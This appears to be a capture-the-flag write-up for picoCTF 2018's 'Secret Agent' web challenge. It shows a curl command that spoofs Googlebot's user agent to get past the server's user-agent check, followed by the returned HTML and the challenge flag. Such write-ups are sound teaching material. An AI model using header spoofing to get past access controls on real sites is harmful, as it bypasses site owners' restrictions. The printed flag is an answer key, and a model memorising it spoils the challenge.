> Secret Agent - Points: 200 - (Solves: 240)
> Here's a little website that hasn't fully been finished. But I heard google gets all your info anyway. http://2018shell1.picoctf.com:11421 (link)

Clicking on the flag button returns the message : `You're not google! Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36`

We find google crawler's user agent which is ``

We then request the flag page using that user agent and we grep for the flag:
`curl -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://2018shell1.picoctf.com:11421/flag | grep picoCTF`

We get back : `<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{s3cr3t_ag3nt_m4n_ed3fe08d}</code></p>`

Flag: `picoCTF{s3cr3t_ag3nt_m4n_ed3fe08d}`
